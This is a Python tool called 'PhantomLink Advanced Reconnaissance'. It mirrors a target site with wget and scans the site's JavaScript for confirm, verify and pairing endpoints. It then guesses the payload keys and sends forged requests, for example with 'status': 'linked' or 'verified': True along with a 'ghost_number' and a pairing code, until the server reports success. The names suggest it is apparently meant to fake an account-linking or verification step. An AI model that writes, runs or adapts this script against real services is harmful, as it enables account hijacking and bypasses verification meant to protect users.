"""PhantomLink Advanced Reconnaissance – Static JS Analysis for Endpoint Discovery"""
import json
import os
import re
import subprocess
import tempfile

import requests


class PlatformRecon:
    def __init__(self, target_url):
        self.target_url = target_url
        self.base_url = '/'.join(target_url.split('/')[:3])  # https://domain.com
        self.js_files = []
        self.endpoints = []
        self.confirm_endpoint = None
        self.confirm_method = 'POST'
        self.confirm_headers = {"Content-Type": "application/json"}
        self.confirm_payload_keys = None
        self.success_signature = None

    def download_site(self):
        """Mirror the site to get all JS files."""
        print(f"[Recon] Mirroring {self.target_url}...")
        tmpdir = tempfile.mkdtemp()
        subprocess.run([
            'wget', '--mirror', '--page-requisites', '--adjust-extension',
            '--span-hosts', '--convert-links', '--no-parent',
            '-P', tmpdir, self.target_url
        ], capture_output=True, text=True, timeout=30)
        # Collect all .js files
        for root, dirs, files in os.walk(tmpdir):
            for f in files:
                if f.endswith('.js'):
                    self.js_files.append(os.path.join(root, f))
        print(f"[Recon] Found {len(self.js_files)} JavaScript files.")

    def search_api_calls(self):
        """Search JS files for API calls related to confirmation."""
        keywords = ['confirm', 'validate', 'verify', 'link', 'code', 'pairing', 'connect']
        patterns = [
            r'["\']((?:https?:)?//[^"\']*(?:confirm|validate|verify|link|code|pairing|connect)[^"\']*)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.(?:post|get|put)\(["\']([^"\']+)["\']',
            r'\.post\(["\']([^"\']+)["\']',
            r'XMLHttpRequest.*?open\(["\'](GET|POST|PUT)["\']\s*,\s*["\']([^"\']+)["\']'
        ]
        found_urls = set()
        for js_file in self.js_files:
            with open(js_file, errors='ignore') as f:
                content = f.read()
                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        if isinstance(match, tuple):
                            url = match[-1]  # last capture group is the URL
                        else:
                            url = match
                        if not url.startswith('http'):
                            url = self.base_url + ('' if url.startswith('/') else '/') + url
                        if any(kw in url.lower() for kw in keywords):
                            found_urls.add(url)
        self.endpoints = list(found_urls)
        print(f"[Recon] Found {len(self.endpoints)} candidate endpoints.")
        # Prioritize those that look like confirmation
        for ep in self.endpoints:
            if 'confirm' in ep or 'validate' in ep or 'verify' in ep:
                self.confirm_endpoint = ep
                break
        if not self.confirm_endpoint and self.endpoints:
            self.confirm_endpoint = self.endpoints[0]

    def infer_payload_from_js(self):
        """Look for code that builds request body and extract keys."""
        for js_file in self.js_files:
            with open(js_file, errors='ignore') as f:
                content = f.read()
                # Look for object with keys like code, phone, number
                if self.confirm_endpoint and self.confirm_endpoint.split('/')[-1] in content:
                    # Extract the surrounding function
                    match = re.search(r'\{[^}]*\bcode\b[^}]*\bphone\b[^}]*\}', content, re.IGNORECASE)
                    if match:
                        obj_str = match.group()
                        keys = re.findall(r'\b(code|phone|number|pairingCode|pairing_code)\b', obj_str, re.IGNORECASE)
                        if keys:
                            self.confirm_payload_keys = list(set(k.lower() for k in keys))
                            print(f"[Recon] Inferred payload keys: {self.confirm_payload_keys}")

    def test_endpoint(self, ghost_number, pairing_code):
        """Test the discovered endpoint with various payloads."""
        if not self.confirm_endpoint:
            return False
        print(f"[Recon] Testing endpoint: {self.confirm_endpoint}")
        # Build payload based on inferred keys
        payloads = []
        if self.confirm_payload_keys:
            payload = {}
            for key in self.confirm_payload_keys:
                if 'code' in key:
                    payload[key] = pairing_code
                elif 'phone' in key or 'number' in key:
                    payload[key] = ghost_number
                else:
                    payload[key] = 'linked'
            payloads.append(payload)
        # Add generic payloads
        payloads.extend([
            {"code": pairing_code, "phone": ghost_number, "status": "linked"},
            {"code": pairing_code, "verified": True},
            {"code": pairing_code, "success": True},
        ])
        for p in payloads:
            try:
                resp = requests.request(self.confirm_method, self.confirm_endpoint,
                                        json=p, headers=self.confirm_headers, timeout=10)
                if resp.status_code == 200:
                    try:
                        body = resp.json()
                        if any(v for v in body.values() if str(v).lower() in ('success','linked','ok','true')):
                            self.success_signature = body
                            print(f"[Recon] SUCCESS with payload: {json.dumps(p)}")
                            return True
                    except:
                        if 'success' in resp.text.lower():
                            print(f"[Recon] SUCCESS with payload: {json.dumps(p)}")
                            return True
            except:
                continue
        return False

    def run(self, ghost_number, pairing_code):
        self.download_site()
        self.search_api_calls()
        self.infer_payload_from_js()
        return self.test_endpoint(ghost_number, pairing_code)
